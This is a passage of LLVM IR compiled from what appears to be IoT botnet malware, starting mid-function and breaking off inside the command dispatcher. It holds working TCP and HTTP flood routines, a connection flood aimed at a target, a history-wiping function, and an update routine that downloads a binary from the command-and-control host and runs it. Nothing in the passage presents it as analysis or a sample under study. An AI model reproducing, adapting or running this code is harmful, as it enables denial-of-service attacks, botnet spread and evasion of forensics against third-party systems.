  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 3
  store i16 %466, i16* %468, align 4
  %469 = call i32 @rand_cmwc()
  %470 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %471 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %470, i32 0, i32 0
  %472 = bitcast %union.anon.0* %471 to %struct.anon.1*
  %473 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %472, i32 0, i32 2
  store i32 %469, i32* %473, align 4
  %474 = call i32 @rand_cmwc()
  %475 = trunc i32 %474 to i16
  %476 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %477 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %476, i32 0, i32 0
  %478 = bitcast %union.anon.0* %477 to %struct.anon.1*
  %479 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %478, i32 0, i32 0
  store i16 %475, i16* %479, align 4
  %480 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %481 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %480, i32 0, i32 0
  %482 = bitcast %union.anon.0* %481 to %struct.anon.1*
  %483 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %482, i32 0, i32 6
  store i16 0, i16* %483, align 4
  %484 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %485 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %486 = call zeroext i16 @tcpcsum(%struct.iphdr* %484, %struct.tcphdr* %485)
  %487 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %488 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %487, i32 0, i32 0
  %489 = bitcast %union.anon.0* %488 to %struct.anon.1*
  %490 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %489, i32 0, i32 6
  store i16 %486, i16* %490, align 4
  %491 = bitcast i8* %95 to i16*
  %492 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 2
  %494 = load i16, i16* %493, align 2
  %495 = zext i16 %494 to i32
  %496 = call zeroext i16 @csum(i16* %491, i32 %495)
  %497 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %498 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %497, i32 0, i32 7
  store i16 %496, i16* %498, align 2
  %499 = load i32, i32* %25, align 4
  %500 = load i32, i32* %15, align 4
  %501 = icmp eq i32 %499, %500
  br i1 %501, label %502, label %508

; <label>:502:                                    ; preds = %456
  %503 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %504 = load i32, i32* %24, align 4
  %505 = icmp sgt i32 %503, %504
  br i1 %505, label %506, label %507

; <label>:506:                                    ; preds = %502
  br label %514

; <label>:507:                                    ; preds = %502
  store i32 0, i32* %25, align 4
  br label %455

; <label>:508:                                    ; preds = %456
  %509 = load i32, i32* %25, align 4
  %510 = add i32 %509, -353733782
  %511 = add i32 %510, 1
  %512 = sub i32 %511, -353733782
  %513 = add i32 %509, 1
  store i32 %512, i32* %25, align 4
  br label %455

; <label>:514:                                    ; preds = %506
  %515 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %515)
  br label %516

; <label>:516:                                    ; preds = %514, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.83, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.84, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [1 x i8], align 1
  %11 = alloca [512 x i8], align 16
  %12 = alloca [3 x i8*], align 16
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %9, align 8
  %17 = bitcast [3 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %17, i8* bitcast ([3 x i8*]* @sendHTTP.methods to i8*), i64 24, i32 16, i1 false)
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i32 @getdtablesize() #2
  %20 = sdiv i32 %19, 2
  store i32 %20, i32* %14, align 4
  store i32 0, i32* %7, align 4
  br label %21

; <label>:21:                                     ; preds = %119, %3
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %14, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %124

; <label>:25:                                     ; preds = %21
  %26 = call i32 @fork() #2
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %118

; <label>:28:                                     ; preds = %25
  br label %29

; <label>:29:                                     ; preds = %117, %28
  %30 = load i8*, i8** %4, align 8
  %31 = load i32, i32* %5, align 4
  %32 = trunc i32 %31 to i16
  %33 = call i32 @socket_connect(i8* %30, i16 zeroext %32)
  store i32 %33, i32* %8, align 4
  %34 = load i32, i32* %8, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %105

; <label>:36:                                     ; preds = %29
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %38 = call i8* @strcpy(i8* %37, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0)) #2
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %41 = call i64 @strlen(i8* %40) #10
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = call i32 @rand() #2
  %44 = sext i32 %43 to i64
  %45 = urem i64 %44, 3
  %46 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 %45
  %47 = load i8*, i8** %46, align 8
  %48 = call i8* @strcpy(i8* %42, i8* %47) #2
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %51 = call i64 @strlen(i8* %50) #10
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = call i8* @strcpy(i8* %52, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.92, i32 0, i32 0)) #2
  %54 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %56 = call i64 @strlen(i8* %55) #10
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = load i8*, i8** %4, align 8
  %59 = call i8* @strcpy(i8* %57, i8* %58) #2
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %62 = call i64 @strlen(i8* %61) #10
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = call i8* @strcpy(i8* %63, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.93, i32 0, i32 0)) #2
  %65 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %66 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %67 = call i64 @strlen(i8* %66) #10
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = call i32 @rand() #2
  %70 = sext i32 %69 to i64
  %71 = urem i64 %70, 32
  %72 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %71
  %73 = load i8*, i8** %72, align 8
  %74 = call i8* @strcpy(i8* %68, i8* %73) #2
  %75 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %76 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %77 = call i64 @strlen(i8* %76) #10
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = call i8* @strcpy(i8* %78, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.94, i32 0, i32 0)) #2
  %80 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %81 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %82 = call i64 @strlen(i8* %81) #10
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = call i32 @rand() #2
  %85 = sext i32 %84 to i64
  %86 = urem i64 %85, 3
  %87 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = call i8* @strcpy(i8* %83, i8* %88) #2
  %90 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %92 = call i64 @strlen(i8* %91) #10
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = call i8* @strcpy(i8* %93, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0)) #2
  %95 = load i32, i32* %8, align 4
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %98 = call i64 @strlen(i8* %97) #10
  %99 = call i64 @write(i32 %95, i8* %96, i64 %98)
  %100 = load i32, i32* %8, align 4
  %101 = getelementptr inbounds [1 x i8], [1 x i8]* %10, i32 0, i32 0
  %102 = call i64 @read(i32 %100, i8* %101, i64 1)
  %103 = load i32, i32* %8, align 4
  %104 = call i32 @close(i32 %103)
  br label %105

; <label>:105:                                    ; preds = %36, %29
  %106 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %9, align 8
  %109 = load i32, i32* %6, align 4
  %110 = sext i32 %109 to i64
  %111 = add i64 %108, -2315679683650581633
  %112 = add i64 %111, %110
  %113 = sub i64 %112, -2315679683650581633
  %114 = add nsw i64 %108, %110
  %115 = icmp sge i64 %107, %113
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %105
  call void @_exit(i32 0) #12
  unreachable

; <label>:117:                                    ; preds = %105
  br label %29

; <label>:118:                                    ; preds = %25
  br label %119

; <label>:119:                                    ; preds = %118
  %120 = load i32, i32* %7, align 4
  %121 = sub i32 0, 1
  %122 = sub i32 %120, %121
  %123 = add nsw i32 %120, 1
  store i32 %122, i32* %7, align 4
  br label %21

; <label>:124:                                    ; preds = %21
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add i32 %10, 1569423385
  %13 = add i32 %12, %11
  %14 = sub i32 %13, 1569423385
  %15 = add nsw i32 %10, %11
  store i32 %14, i32* %7, align 4
  %16 = load i8*, i8** %4, align 8
  %17 = call i32 @inet_addr(i8* %16) #2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 %17, i32* %19, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = load i32, i32* %5, align 4
  %22 = trunc i32 %21 to i16
  %23 = call zeroext i16 @htons(i16 zeroext %22) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  br label %25

; <label>:25:                                     ; preds = %29, %3
  %26 = load i32, i32* %7, align 4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = icmp sgt i32 %26, %27
  br i1 %28, label %29, label %37

; <label>:29:                                     ; preds = %25
  %30 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %33 = call i32 @connect(i32 %31, %struct.sockaddr* %32, i32 16)
  %34 = call i32 @sleep(i32 1)
  %35 = load i32, i32* %8, align 4
  %36 = call i32 @close(i32 %35)
  br label %25

; <label>:37:                                     ; preds = %25
  ret void
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @findwritedir() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.killerinfo*, align 8
  %3 = alloca %struct.__dirstream*, align 8
  %4 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.96, i32 0, i32 0))
  store %struct.__dirstream* %4, %struct.__dirstream** %3, align 8
  %5 = icmp eq %struct.__dirstream* %4, null
  br i1 %5, label %6, label %11

; <label>:6:                                      ; preds = %0
  %7 = load %struct.killerinfo*, %struct.killerinfo** %2, align 8
  %8 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %7, i32 0, i32 0
  %9 = load i8*, i8** %8, align 8
  %10 = call i8* @strcpy(i8* %9, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.97, i32 0, i32 0)) #2
  store i32 1, i32* %1, align 4
  br label %20

; <label>:11:                                     ; preds = %0
  %12 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.98, i32 0, i32 0))
  store %struct.__dirstream* %12, %struct.__dirstream** %3, align 8
  %13 = icmp eq %struct.__dirstream* %12, null
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %11
  %15 = load %struct.killerinfo*, %struct.killerinfo** %2, align 8
  %16 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %15, i32 0, i32 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i8* @strcpy(i8* %17, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.99, i32 0, i32 0)) #2
  store i32 1, i32* %1, align 4
  br label %20

; <label>:19:                                     ; preds = %11
  store i32 0, i32* %1, align 4
  br label %20

; <label>:20:                                     ; preds = %19, %14, %6
  %21 = load i32, i32* %1, align 4
  ret i32 %21
}

declare %struct.__dirstream* @opendir(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getArch() #0 {
  %1 = alloca [32 x i8], align 16
  %2 = alloca i8*, align 8
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.100, i32 0, i32 0), i8** %2, align 8
  %3 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i32 0, i32 0
  %4 = load i8*, i8** %2, align 8
  %5 = call i8* @strcpy(i8* %3, i8* %4) #2
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i32 0, i32 0
  ret i8* %6
}

; Function Attrs: noinline nounwind uwtable
define i32 @httpsocket(i8*, i32, i8*, i8*) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [128 x i8], align 16
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8, align 1
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %15, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %21, align 4
  %22 = load i32, i32* %7, align 4
  %23 = trunc i32 %22 to i16
  %24 = call zeroext i16 @htons(i16 zeroext %23) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i8*, i8** %6, align 8
  %27 = call i32 @inet_addr(i8* %26) #2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 (i8*, i32, ...) @open(i8* %30, i32 577, i32 511)
  store i32 %31, i32* %13, align 4
  %32 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %32, i32* %12, align 4
  %33 = load i32, i32* %12, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %38, label %35

; <label>:35:                                     ; preds = %4
  %36 = load i32, i32* %13, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %35, %4
  store i32 0, i32* %5, align 4
  br label %112

; <label>:39:                                     ; preds = %35
  %40 = load i32, i32* %12, align 4
  %41 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %14, align 4
  %43 = icmp slt i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  store i32 0, i32* %5, align 4
  br label %112

; <label>:45:                                     ; preds = %39
  %46 = load i8*, i8** %16, align 8
  %47 = call i8* @strcpy(i8* %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i32 0, i32 0)) #2
  %48 = load i8*, i8** %16, align 8
  %49 = load i8*, i8** %16, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8*, i8** %8, align 8
  %53 = call i8* @strcpy(i8* %51, i8* %52) #2
  %54 = load i8*, i8** %16, align 8
  %55 = load i8*, i8** %16, align 8
  %56 = call i64 @strlen(i8* %55) #10
  %57 = getelementptr inbounds i8, i8* %54, i64 %56
  %58 = call i8* @strcpy(i8* %57, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.102, i32 0, i32 0)) #2
  %59 = load i8*, i8** %16, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = trunc i64 %60 to i32
  store i32 %61, i32* %17, align 4
  %62 = load i32, i32* %12, align 4
  %63 = load i8*, i8** %16, align 8
  %64 = load i32, i32* %17, align 4
  %65 = sext i32 %64 to i64
  %66 = call i64 @write(i32 %62, i8* %63, i64 %65)
  %67 = load i32, i32* %17, align 4
  %68 = sext i32 %67 to i64
  %69 = icmp ne i64 %66, %68
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %112

; <label>:71:                                     ; preds = %45
  br label %72

; <label>:72:                                     ; preds = %82, %71
  %73 = load i32, i32* %15, align 4
  %74 = icmp ne i32 %73, 218762506
  br i1 %74, label %75, label %91

; <label>:75:                                     ; preds = %72
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @read(i32 %76, i8* %18, i64 1)
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %19, align 4
  %79 = load i32, i32* %19, align 4
  %80 = icmp ne i32 %79, 1
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %75
  store i32 0, i32* %5, align 4
  br label %112

; <label>:82:                                     ; preds = %75
  %83 = load i32, i32* %15, align 4
  %84 = shl i32 %83, 8
  %85 = load i8, i8* %18, align 1
  %86 = sext i8 %85 to i32
  %87 = and i32 %84, %86
  %88 = xor i32 %84, %86
  %89 = or i32 %87, %88
  %90 = or i32 %84, %86
  store i32 %89, i32* %15, align 4
  br label %72

; <label>:91:                                     ; preds = %72
  %92 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.103, i32 0, i32 0))
  br label %93

; <label>:93:                                     ; preds = %101, %91
  %94 = load i32, i32* %12, align 4
  %95 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %96 = call i64 @read(i32 %94, i8* %95, i64 128)
  %97 = trunc i64 %96 to i32
  store i32 %97, i32* %20, align 4
  %98 = load i32, i32* %20, align 4
  %99 = icmp sle i32 %98, 0
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %93
  br label %107

; <label>:101:                                    ; preds = %93
  %102 = load i32, i32* %13, align 4
  %103 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %104 = load i32, i32* %20, align 4
  %105 = sext i32 %104 to i64
  %106 = call i64 @write(i32 %102, i8* %103, i64 %105)
  br label %93

; <label>:107:                                    ; preds = %100
  %108 = load i32, i32* %12, align 4
  %109 = call i32 @close(i32 %108)
  %110 = load i32, i32* %13, align 4
  %111 = call i32 @close(i32 %110)
  store i32 1, i32* %5, align 4
  br label %112

; <label>:112:                                    ; preds = %107, %81, %70, %44, %38
  %113 = load i32, i32* %5, align 4
  ret i32 %113
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @UpdateBins() #0 {
  %1 = alloca %struct.killerinfo*, align 8
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = call i32 @findwritedir()
  %5 = load %struct.killerinfo*, %struct.killerinfo** %1, align 8
  %6 = getelementptr inbounds %struct.killerinfo, %struct.killerinfo* %5, i32 0, i32 0
  %7 = load i8*, i8** %6, align 8
  %8 = call i32 @chdir(i8* %7) #2
  %9 = load i8*, i8** %2, align 8
  %10 = call i8* @strcpy(i8* %9, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %11 = load i8*, i8** %2, align 8
  %12 = call i8* @getArch()
  %13 = call i8* @strcpy(i8* %11, i8* %12) #2
  %14 = load i8*, i8** @cncip, align 8
  %15 = load i8*, i8** %2, align 8
  %16 = call i32 @httpsocket(i8* %14, i32 80, i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0))
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %0
  br label %21

; <label>:19:                                     ; preds = %0
  %20 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  br label %39

; <label>:21:                                     ; preds = %18
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @strcpy(i8* %22, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i32 0, i32 0)) #2
  %24 = load i8*, i8** %3, align 8
  %25 = load i8*, i8** %3, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = call i8* @strcpy(i8* %27, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0)) #2
  %29 = load i8*, i8** %3, align 8
  %30 = load i8*, i8** %3, align 8
  %31 = call i64 @strlen(i8* %30) #10
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i8* @strcpy(i8* %32, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.107, i32 0, i32 0)) #2
  %34 = load i8*, i8** %3, align 8
  %35 = call i32 @system(i8* %34)
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.108, i32 0, i32 0))
  %38 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  br label %39

; <label>:39:                                     ; preds = %21, %19
  ret void
}

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i8*, align 8
  %42 = alloca i32, align 4
  %43 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #10
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %2
  %50 = load i32, i32* @mainCommSock, align 4
  %51 = call i32 (i32, i8*, ...) @sockprintf(i32 %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0))
  br label %728

; <label>:52:                                     ; preds = %2
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 0
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.110, i32 0, i32 0)) #10
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %62, label %58

; <label>:58:                                     ; preds = %52
  call void @UpdateBins()
  %59 = load i32, i32* @pgid, align 4
  %60 = mul nsw i32 %59, -1
  %61 = call i32 @kill(i32 %60, i32 9) #2
  call void @exit(i32 0) #14
  unreachable

; <label>:62:                                     ; preds = %52
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 0
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @strcmp(i8* %65, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.111, i32 0, i32 0)) #10
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %89, label %68

; <label>:68:                                     ; preds = %62
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 1
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @strcmp(i8* %71, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0)) #10
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %78, label %74

; <label>:74:                                     ; preds = %68
  %75 = call i32 (...) @killer_kill()
  %76 = load i32, i32* @mainCommSock, align 4
  %77 = call i32 (i32, i8*, ...) @sockprintf(i32 %76, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.113, i32 0, i32 0))
  br label %78

; <label>:78:                                     ; preds = %74, %68
  %79 = load i8**, i8*** %4, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i32 0, i32 0)) #10
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %88, label %84

; <label>:84:                                     ; preds = %78
  %85 = call i32 (...) @killer_init()
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = call i32 (i32, i8*, ...) @sockprintf(i32 %86, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.115, i32 0, i32 0))
  br label %88

; <label>:88:                                     ; preds = %84, %78
  br label %728

; <label>:89:                                     ; preds = %62
  %90 = load i8**, i8*** %4, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 0
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 @strcmp(i8* %92, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.116, i32 0, i32 0)) #10
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %100, label %95

; <label>:95:                                     ; preds = %89
  %96 = load i32, i32* @mainCommSock, align 4
